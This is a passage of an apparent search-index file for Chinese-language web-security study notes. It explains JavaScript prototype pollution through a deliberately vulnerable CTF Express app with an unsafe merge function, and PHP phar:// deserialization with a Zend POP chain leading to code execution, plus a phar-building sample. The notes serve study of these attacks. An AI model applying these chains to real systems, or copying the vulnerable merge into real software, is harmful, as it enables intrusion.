object.prototype->null","title":"\u521b\u5efa\u4e00\u4e2a\u6570\u7ec4\u65f6"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_7","text":"\u539f\u578b\u94fe\u4e3a\uff1a d -> function.prototype -> object.prototype->null","title":"\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u65f6"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_8","text":"f -> Data.prototype -> object.prototype->null \u5f97\u51fa\uff1a javascript \u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u4e00\u5207\u7686\u59cb\u4e8e object.prototype","title":"\u521b\u5efa\u4e00\u4e2a\u65e5\u671f"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_9","text":"\u5f53\u8981\u4f7f\u7528\u6216\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\u65f6\uff1a\u9996\u5148\u4f1a\u5728\u672c\u5c42\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u5411\u4e0a\u641c\u7d22\uff0c\u5373\u5728\u81ea\u5df1\u7684\u7236\u7c7b\u4e2d\u641c\u7d22\uff0c\u5f53\u7236\u7c7b\u4e2d\u4e5f\u6ca1\u6709\u65f6\uff0c\u5c31\u4f1a\u5411\u7956\u7236\u7c7b\u641c\u7d22\uff0c\u76f4\u5230\u6307\u5411null\uff0c\u5982\u679c\u6b64\u65f6\u8fd8\u6ca1\u6709\u641c\u7d22\u5230\uff0c\u5c31\u4f1a\u8fd4\u56de undefined j -> i.prototype -> object.prototype -> null","title":"\u641c\u7d22\u7684\u8fc7\u7a0b"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_10","text":"mess.js \u6587\u4ef6 1 2 3 4 5 ( function () { var secret = [ \"aaa\" , \"bbb\" ]; secret . forEach (); })(); attach.html \u7ed3\u679c\u5982\u4e0b\uff1a mess.js\u4e2d\u6211\u4eec\u58f0\u660e\u4e86\u4e00\u4e2a\u6570\u7ec4 secret ,\u7136\u540e\u8be5\u6570\u7ec4\u8c03\u7528\u4e86\u5c5e\u4e8e Array.protottype \u7684 foreach \u65b9\u6cd5,\u5982\u4e0b \u5728\u8c03\u7528js\u6587\u4ef6\u4e4b\u524d\uff0cjs\u4ee3\u7801\u4e2d\u5c06 Array.prototype.foreach \u65b9\u6cd5\u8fdb\u884c\u4e86\u91cd\u5199\uff0c\u800cprototype\u94fe\u4e3a secret -> Array.prototype ->object.prototype ,secret\u4e2d\u65e0 foreach \u65b9\u6cd5\uff0c\u6240\u4ee5\u5c31\u4f1a\u5411\u4e0a\u68c0\u7d22\uff0c\u5c31\u627e\u5230\u4e86 Array.prototype \u800c\u5176 foreach \u65b9\u6cd5\u5df2\u7ecf\u88ab\u91cd\u5199\u8fc7\u4e86\uff0c\u6240\u4ee5\u4f1a\u6267\u884c\u8f93\u51fa\u3002 \u8fd9\u5c31\u662f\u539f\u578b\u94fe\u6c61\u67d3\u3002\u5f88\u660e\u663e\uff0c\u539f\u578b\u94fe\u6c61\u67d3\u5c31\u662f\uff1a \u5728\u6211\u4eec\u60f3\u8981\u5229\u7528\u7684\u4ee3\u7801\u4e4b\u524d\u7684\u8d4b\u503c\u8bed\u53e5\u5982\u679c\u53ef\u63a7\u7684\u8bdd\uff0c\u6211\u4eec\u8fdb\u884c \u2014\u2014__proto__ \u8d4b\u503c\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u4ee3\u7801\u4e86 \u770b\u4e00\u9053\u9898\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 'use strict' ; const express = require ( 'express' ); const bodyParser = require ( 'body-parser' ) const cookieParser = require ( 'cookie-parser' ); const path = require ( 'path' ); const isObject = obj => obj && obj . constructor && obj . constructor === Object ; function merge ( a , b ) { for ( var attr in b ) { if ( isObject ( a [ attr ]) && isObject ( b [ attr ])) { merge ( a [ attr ], b [ attr ]); } else { a [ attr ] = b [ attr ]; } } return a } function clone ( a ) { return merge ({}, a ); } // Constants const PORT = 8080 ; const HOST = '0.0.0.0' ; const admin = {}; // App const app = express (); app . use ( bodyParser . json ()) app . use ( cookieParser ()); app . use ( '/' , express . static ( path . join ( __dirname , 'views' ))); app . post ( '/signup' , ( req , res ) => { var body = JSON . parse ( JSON . stringify ( req . body )); var copybody = clone ( body ) if ( copybody . name ) { res . cookie ( 'name' , copybody . name ). json ({ \"done\" : \"cookie set\" }); } else { res . json ({ \"error\" : \"cookie not set\" }) } }); app . get ( '/getFlag' , ( req , res ) => { var \u0430dmin = JSON . parse ( JSON . stringify ( req . cookies )) if ( admin . \u0430dmin == 1 ) { res . send ( \"hackim19{}\" ); } else { res . send ( \"You are not authorized\" ); } }); app . listen ( PORT , HOST ); console . log ( `Running on http:// ${ HOST } : ${ PORT } ` ); \u672c\u5730\u6d4b\u8bd5\uff1a \u672a\u6210\u529f \u4eec\u5728\u521b\u5efa\u5b57\u5178\u7684\u65f6\u5019\uff0c __proto__ ,\u4e0d\u662f\u4f5c\u4e3a\u4e00\u4e2a\u952e\u540d\uff0c\u800c\u662f\u5df2\u7ecf\u4f5c\u4e3a __proto__ \u7ed9\u5176\u7236\u7c7b\u8fdb\u884c\u8d4b\u503c\u4e86\uff0c\u6240\u4ee5\u5728 test.__proto__ \u4e2d\u624d\u6709admin\u5c5e\u6027\uff0c\u4f46\u662f\u6211\u4eec\u662f\u60f3\u8ba9 __proto__ \u4f5c\u4e3a\u4e00\u4e2a\u952e\u503c\u7684. \u4f7f\u7528JSON.parse JSON.parse \u4f1a\u628a\u4e00\u4e2ajson\u5b57\u7b26\u4e32 \u8f6c\u5316\u4e3a javascript\u7684object","title":"\u4e3e\u4f8b"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_11","text":"https://xz.aliyun.com/t/2735 https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming https://www.anquanke.com/post/id/176884 \u6df1\u5165\u7406\u89e3JavaScript prototype\u6c61\u67d3\u653b\u51fb \u7ffb\u8bd1JavaScript\u539f\u578b\u94fe\u6c61\u67d3 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"\u53c2\u8003"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/","text":"\u53cd\u5e8f\u5217\u5316 \u00b6 \u81ea\u4ece Orange \u5728 2017\u5e74\u7684 hitcon \u51fa\u4e86\u4e00\u4e2a 0day \u7684 php phar:// \u53cd\u5e8f\u5217\u5316\u7ed9\u6574\u4e2a\u5b89\u5168\u754c\u5f00\u542f\u4e86\u65b0\u4e16\u754c\u7684\u5927\u95e8\u4ee5\u540e\uff0cphp \u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u6f0f\u6d1e\u5c31\u9010\u6e10\u5347\u6e29\uff0c\u6ca1\u60f3\u5230\u540e\u6765 2018 \u5e74 blackhat \u7684\u8bae\u9898\u4e0a\u8fd9\u4e2a\u95ee\u9898\u518d\u6b21\u88ab\u63d0\u53ca\uff0c\u5229\u7528\u7684\u8fd8\u662f Orange \u7684\u601d\u8def(\u6211\u53ea\u80fd orz),\u5230\u73b0\u5728 phar:// \u53cd\u5e8f\u5217\u5316\u5df2\u7ecf\u6210\u4e3a\u4e86\u5404\u5927 CTF \u7099\u624b\u53ef\u70ed\u7684\u601d\u8def\uff0c\u5c31\u4eff\u4f5b 2016 \u5e74\u7684 CVE-2016-7124 \u7ed5\u8fc7 __weakup \u4e00\u6837\uff0c\u4e8e\u662f\u6211\u4e5f\u628a\u8fd9\u7bc7\u6587\u7ae0\u63d0\u4e0a\u65e5\u7a0b\uff0c\u5e0c\u671b\u80fd\u5728\u5bf9\u6574\u4e2a PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5256\u6790\u8fc7\u7a0b\u4e2d\u5bf9\u5176\u6709\u66f4\u6df1\u5165\u7684\u7406\u89e3\uff0c\u4e5f\u5e0c\u671b\u8bfb\u8005\u5728\u8bfb\u6211\u7684\u6587\u7ae0\u4e2d\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u548c\u6536\u83b7(\u5982\u679c\u771f\u7684\u662f\u8fd9\u6837\uff0c\u8fd9\u5c06\u662f\u6211\u83ab\u5927\u7684\u8363\u5e78) \u4ecejason\u5f00\u59cb\u7c7b\u6bd4 \u00b6 POP\u94fe\u5b9e\u6218 \u00b6 \u6574\u4e2a\u4ee3\u7801\u7247\u6bb5\u6211\u5c06\u4ee5\u56fe\u7247\u7684\u5f62\u5f0f\u5c55\u73b0\uff0c\u6709\u5174\u8da3\u7684\u8bfb\u8005\u8bf7\u5148\u81ea\u5df1\u5206\u6790\uff0c\u4e4b\u540e\u5728\u770b\u6211\u7684\u5206\u6790\uff0c \u5f53\u7136\u8fd9\u4e2a\u6848\u4f8b\u91cc\u9762\u4f3c\u4e4e\u5c11\u4e86\u6bd4\u8f83\u5173\u952e\u7684 unserialize() \u51fd\u6570\uff0c\u90a3\u6211\u4eec\u5c31\u5047\u8bbe\u8fd9\u4e2a unserialize() \u5728\u6211\u4eec\u7684\u7b2c\u4e00\u5f20\u56fe\u7247\u7684\u91cc\u9762\uff0c\u5e76\u4e14\u53c2\u6570\u5b8c\u5168\u53ef\u63a7 \u5982\u4e0b\u8fd9\u4e2a\u7c7b\u4e2d\u6709\u4e00\u4e2a __destruct \u65b9\u6cd5\uff0c\u6211\u4eec\u8981\u5c1d\u8bd5\u63a7\u5236 $_writers \u8c03\u7528 shutdown \u65b9\u6cd5 Zend_Log_Writer_Mail \u7c7b\u4e2d\u6709\u4e00\u4e2a shutdown \u65b9\u6cd5\u53ef\u4ee5\u5c1d\u8bd5\uff0c\u6211\u4eec\u770b\u5230\u8fd9\u4e2a\u7c7b\u91cc\u9762\u4f7f\u7528\u4e86 $write \u5bf9\u8c61\u7684\u5f88\u591a\u5c5e\u6027\uff0c\u6bd4\u5982\u8bf4 _layout \uff0c\u7136\u540e\u6211\u4eec\u53c8\u53d1\u73b0\u8fd9\u4e2a\u5c5e\u6027\u4e5f\u8c03\u7528\u4e86\u4e00\u4e2a\u65b9\u6cd5 render() \uff0c\u8bf4\u660e\u8fd9\u4e2a\u5c5e\u6027\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e8e\u662f\u6211\u4eec\u8fd8\u8981\u5411\u66f4\u6df1\u5904\u6316\u6398 _layout \u662f\u8c01\u7684\u5bf9\u8c61\u5462\uff1f\u6211\u4eec\u53d1\u73b0\u4ed6\u662f Zend_layout \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u540c\u6837\u7684\uff0c\u4ed6\u91cc\u9762\u662f\u7528\u4e86\u4e00\u4e2a _inflector \u7684\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8c03\u7528\u4e86 filter \u65b9\u6cd5\uff0c\u770b\u6765\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61 \u6211\u4eec\u53d1\u73b0 _inflector \u662f Zend_Filter_PregReplace \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e9b\u5c5e\u6027\u662f\u80fd\u8fdb\u884c\u76f4\u63a5\u63a7\u5236\u7684\uff0c\u5e76\u4e14\u5728\u8c03\u7528 filter \u65b9\u6cd5\u7684\u65f6\u5019\u80fd\u76f4\u63a5\u89e6\u53d1 preg_replace() \u65b9\u6cd5\uff0c\u592a\u597d\u4e86\u8fd9\u6b63\u662f\u6211\u4eec\u60f3\u8981\u7684\uff0c\u6211\u4eec\u53ea\u8981\u63a7\u5236\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u80fd\u5b9e\u73b0\u6211\u4eec\u7684\u5229\u7528\u94fe \u6240\u4ee5\u6574\u4e2a POP \u94fe\u5c31\u662f 1 writer->shutdown()->render()->filter()->preg_replace(\u6211\u4eec\u63a7\u5236\u7684\u5c5e\u6027)->\u4ee3\u7801\u6267\u884c \u5229\u7528 phar:// \u62d3\u5c55 PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762 \u00b6 1.\u56de\u987e\u4e00\u4e0b\u539f\u5148 PHP \u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u5fc5\u8981\u6761\u4ef6 \u00b6 (1)\u9996\u5148\u6211\u4eec\u5fc5\u987b\u6709 unserailize() \u51fd\u6570 (2)unserailize() \u51fd\u6570\u7684\u53c2\u6570\u5fc5\u987b\u53ef\u63a7 \u8fd9\u4e24\u4e2a\u662f\u539f\u5148\u5b58\u5728 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5fc5\u8981\u6761\u4ef6\uff0c\u6ca1\u6709\u8fd9\u4e24\u4e2a\u6761\u4ef6\u4f60\u8c08\u90fd\u4e0d\u8981\u8c08\uff0c\u6839\u672c\u4e0d\u53ef\u80fd\uff0c\u4f46\u662f\u4ece2017 \u5e74\u5f00\u59cb Orange \u544a\u8bc9\u6211\u4eec\u662f\u53ef\u4ee5\u7684 2.phar:// \u5982\u4f55\u6269\u5c55\u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762\u7684 \u00b6 \u539f\u6765 phar \u6587\u4ef6\u5305\u5728 \u751f\u6210\u65f6\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data \uff0c\u914d\u5408 phar:// \u6211\u4eec\u5c31\u80fd\u5728\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 file_exists() is_dir() \u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u80fd\u901a\u8fc7\u6784\u9020\u7cbe\u5fc3\u8bbe\u8ba1\u7684 phar \u5305\u5728\u6ca1\u6709 unserailize() \u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u4ece\u800c\u5c06 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u89e6\u53d1\u6761\u4ef6\u5927\u5927\u62d3\u5bbd\u4e86\uff0c\u964d\u4f4e\u4e86\u6211\u4eec PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u8d77\u70b9\u3002 3.\u5177\u4f53\u89e3\u91ca\u4e00\u4e0b phar \u7684\u4f7f\u7528 \u00b6 1.Phar \u7684\u6587\u4ef6\u7ed3\u6784 \u00b6 phar \u6587\u4ef6\u6700\u6838\u5fc3\u4e5f\u662f\u5fc5\u987b\u8981\u6709\u7684\u90e8\u5206\u5982\u56fe\u6240\u793a\uff1a (1) a stub \u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2aPHP \u6587\u4ef6\u5b9e\u9645\u4e0a\u6211\u4eec\u80fd\u5c06\u5176\u7b80\u5316\u4e3a\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50 \u683c\u5f0f\u4e3a: 1 xxx<?php xxx; __HALT_COMPILER();?> \u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u8fd9\u90e8\u5206\u7684\u76ee\u7684\u5c31\u662f\u8ba9 phar \u6269\u5c55\u8bc6\u522b\u8fd9\u662f\u4e00\u4e2a\u6807\u51c6\u7684 phar \u6587\u4ef6 (2\uff09a manifest describing the contents \u56e0\u4e3a Phar \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u538b\u7f29\u6587\u4ef6\uff0c\u5b83\u91cc\u9762\u5b58\u50a8\u7740\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data \uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 (3)the file contents \u8fd9\u90e8\u5206\u5c31\u662f\u6211\u4eec\u60f3\u8981\u538b\u7f29\u5728 phar \u538b\u7f29\u5305\u5185\u90e8\u7684\u6587\u4ef6 2.\u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u5408\u6cd5\u7684 Phar\u538b\u7f29\u6587\u4ef6 \u00b6 \u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u56e0\u4e3a\u4e0d\u662f\u6587\u672c\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528 hexdump \u770b\u4e00\u4e0b\u6587\u4ef6\u7684\u5185\u5bb9 \u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u6e05\u695a\u5730\u770b\u5230\u6211\u4eec\u7684 TestObject \u7c7b\u5df2\u7ecf\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u5165\u6587\u4ef6\u4e2d \u6211\u4eec\u521a\u521a\u8bf4\u8fc7\u4e86\uff0cphp\u4e00\u5927\u90e8\u5206\u7684\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u5728\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 \u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a \u53c2\u8003 \u00b6 \u6df1\u5165\u7406\u89e3PHP\u53cd\u5e8f\u5217\u5316","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#_1","text":"\u81ea\u4ece Orange \u5728 2017\u5e74\u7684 hitcon \u51fa\u4e86\u4e00\u4e2a 0day \u7684 php phar:// \u53cd\u5e8f\u5217\u5316\u7ed9\u6574\u4e2a\u5b89\u5168\u754c\u5f00\u542f\u4e86\u65b0\u4e16\u754c\u7684\u5927\u95e8\u4ee5\u540e\uff0cphp \u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u6f0f\u6d1e\u5c31\u9010\u6e10\u5347\u6e29\uff0c\u6ca1\u60f3\u5230\u540e\u6765 2018 \u5e74 blackhat \u7684\u8bae\u9898\u4e0a\u8fd9\u4e2a\u95ee\u9898\u518d\u6b21\u88ab\u63d0\u53ca\uff0c\u5229\u7528\u7684\u8fd8\u662f Orange \u7684\u601d\u8def(\u6211\u53ea\u80fd orz),\u5230\u73b0\u5728 phar:// \u53cd\u5e8f\u5217\u5316\u5df2\u7ecf\u6210\u4e3a\u4e86\u5404\u5927 CTF \u7099\u624b\u53ef\u70ed\u7684\u601d\u8def\uff0c\u5c31\u4eff\u4f5b 2016 \u5e74\u7684 CVE-2016-7124 \u7ed5\u8fc7 __weakup \u4e00\u6837\uff0c\u4e8e\u662f\u6211\u4e5f\u628a\u8fd9\u7bc7\u6587\u7ae0\u63d0\u4e0a\u65e5\u7a0b\uff0c\u5e0c\u671b\u80fd\u5728\u5bf9\u6574\u4e2a PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5256\u6790\u8fc7\u7a0b\u4e2d\u5bf9\u5176\u6709\u66f4\u6df1\u5165\u7684\u7406\u89e3\uff0c\u4e5f\u5e0c\u671b\u8bfb\u8005\u5728\u8bfb\u6211\u7684\u6587\u7ae0\u4e2d\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u548c\u6536\u83b7(\u5982\u679c\u771f\u7684\u662f\u8fd9\u6837\uff0c\u8fd9\u5c06\u662f\u6211\u83ab\u5927\u7684\u8363\u5e78)","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#jason","text":"","title":"\u4ecejason\u5f00\u59cb\u7c7b\u6bd4"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#pop","text":"\u6574\u4e2a\u4ee3\u7801\u7247\u6bb5\u6211\u5c06\u4ee5\u56fe\u7247\u7684\u5f62\u5f0f\u5c55\u73b0\uff0c\u6709\u5174\u8da3\u7684\u8bfb\u8005\u8bf7\u5148\u81ea\u5df1\u5206\u6790\uff0c\u4e4b\u540e\u5728\u770b\u6211\u7684\u5206\u6790\uff0c \u5f53\u7136\u8fd9\u4e2a\u6848\u4f8b\u91cc\u9762\u4f3c\u4e4e\u5c11\u4e86\u6bd4\u8f83\u5173\u952e\u7684 unserialize() \u51fd\u6570\uff0c\u90a3\u6211\u4eec\u5c31\u5047\u8bbe\u8fd9\u4e2a unserialize() \u5728\u6211\u4eec\u7684\u7b2c\u4e00\u5f20\u56fe\u7247\u7684\u91cc\u9762\uff0c\u5e76\u4e14\u53c2\u6570\u5b8c\u5168\u53ef\u63a7 \u5982\u4e0b\u8fd9\u4e2a\u7c7b\u4e2d\u6709\u4e00\u4e2a __destruct \u65b9\u6cd5\uff0c\u6211\u4eec\u8981\u5c1d\u8bd5\u63a7\u5236 $_writers \u8c03\u7528 shutdown \u65b9\u6cd5 Zend_Log_Writer_Mail \u7c7b\u4e2d\u6709\u4e00\u4e2a shutdown \u65b9\u6cd5\u53ef\u4ee5\u5c1d\u8bd5\uff0c\u6211\u4eec\u770b\u5230\u8fd9\u4e2a\u7c7b\u91cc\u9762\u4f7f\u7528\u4e86 $write \u5bf9\u8c61\u7684\u5f88\u591a\u5c5e\u6027\uff0c\u6bd4\u5982\u8bf4 _layout \uff0c\u7136\u540e\u6211\u4eec\u53c8\u53d1\u73b0\u8fd9\u4e2a\u5c5e\u6027\u4e5f\u8c03\u7528\u4e86\u4e00\u4e2a\u65b9\u6cd5 render() \uff0c\u8bf4\u660e\u8fd9\u4e2a\u5c5e\u6027\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e8e\u662f\u6211\u4eec\u8fd8\u8981\u5411\u66f4\u6df1\u5904\u6316\u6398 _layout \u662f\u8c01\u7684\u5bf9\u8c61\u5462\uff1f\u6211\u4eec\u53d1\u73b0\u4ed6\u662f Zend_layout \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u540c\u6837\u7684\uff0c\u4ed6\u91cc\u9762\u662f\u7528\u4e86\u4e00\u4e2a _inflector \u7684\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8c03\u7528\u4e86 filter \u65b9\u6cd5\uff0c\u770b\u6765\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61 \u6211\u4eec\u53d1\u73b0 _inflector \u662f Zend_Filter_PregReplace \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e9b\u5c5e\u6027\u662f\u80fd\u8fdb\u884c\u76f4\u63a5\u63a7\u5236\u7684\uff0c\u5e76\u4e14\u5728\u8c03\u7528 filter \u65b9\u6cd5\u7684\u65f6\u5019\u80fd\u76f4\u63a5\u89e6\u53d1 preg_replace() \u65b9\u6cd5\uff0c\u592a\u597d\u4e86\u8fd9\u6b63\u662f\u6211\u4eec\u60f3\u8981\u7684\uff0c\u6211\u4eec\u53ea\u8981\u63a7\u5236\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u80fd\u5b9e\u73b0\u6211\u4eec\u7684\u5229\u7528\u94fe \u6240\u4ee5\u6574\u4e2a POP \u94fe\u5c31\u662f 1 writer->shutdown()->render()->filter()->preg_replace(\u6211\u4eec\u63a7\u5236\u7684\u5c5e\u6027)->\u4ee3\u7801\u6267\u884c","title":"POP\u94fe\u5b9e\u6218"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#phar-php","text":"","title":"\u5229\u7528 phar:// \u62d3\u5c55 PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#1-php","text":"(1)\u9996\u5148\u6211\u4eec\u5fc5\u987b\u6709 unserailize() \u51fd\u6570 (2)unserailize() \u51fd\u6570\u7684\u53c2\u6570\u5fc5\u987b\u53ef\u63a7 \u8fd9\u4e24\u4e2a\u662f\u539f\u5148\u5b58\u5728 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5fc5\u8981\u6761\u4ef6\uff0c\u6ca1\u6709\u8fd9\u4e24\u4e2a\u6761\u4ef6\u4f60\u8c08\u90fd\u4e0d\u8981\u8c08\uff0c\u6839\u672c\u4e0d\u53ef\u80fd\uff0c\u4f46\u662f\u4ece2017 \u5e74\u5f00\u59cb Orange \u544a\u8bc9\u6211\u4eec\u662f\u53ef\u4ee5\u7684","title":"1.\u56de\u987e\u4e00\u4e0b\u539f\u5148 PHP \u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u5fc5\u8981\u6761\u4ef6"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#2phar","text":"\u539f\u6765 phar \u6587\u4ef6\u5305\u5728 \u751f\u6210\u65f6\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data \uff0c\u914d\u5408 phar:// \u6211\u4eec\u5c31\u80fd\u5728\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 file_exists() is_dir() \u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u80fd\u901a\u8fc7\u6784\u9020\u7cbe\u5fc3\u8bbe\u8ba1\u7684 phar \u5305\u5728\u6ca1\u6709 unserailize() \u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u4ece\u800c\u5c06 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u89e6\u53d1\u6761\u4ef6\u5927\u5927\u62d3\u5bbd\u4e86\uff0c\u964d\u4f4e\u4e86\u6211\u4eec PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u8d77\u70b9\u3002","title":"2.phar:// \u5982\u4f55\u6269\u5c55\u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762\u7684"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#3-phar","text":"","title":"3.\u5177\u4f53\u89e3\u91ca\u4e00\u4e0b phar \u7684\u4f7f\u7528"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#1phar","text":"phar \u6587\u4ef6\u6700\u6838\u5fc3\u4e5f\u662f\u5fc5\u987b\u8981\u6709\u7684\u90e8\u5206\u5982\u56fe\u6240\u793a\uff1a (1) a stub \u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2aPHP \u6587\u4ef6\u5b9e\u9645\u4e0a\u6211\u4eec\u80fd\u5c06\u5176\u7b80\u5316\u4e3a\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50 \u683c\u5f0f\u4e3a: 1 xxx<?php xxx; __HALT_COMPILER();?> \u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u8fd9\u90e8\u5206\u7684\u76ee\u7684\u5c31\u662f\u8ba9 phar \u6269\u5c55\u8bc6\u522b\u8fd9\u662f\u4e00\u4e2a\u6807\u51c6\u7684 phar \u6587\u4ef6 (2\uff09a manifest describing the contents \u56e0\u4e3a Phar \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u538b\u7f29\u6587\u4ef6\uff0c\u5b83\u91cc\u9762\u5b58\u50a8\u7740\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data 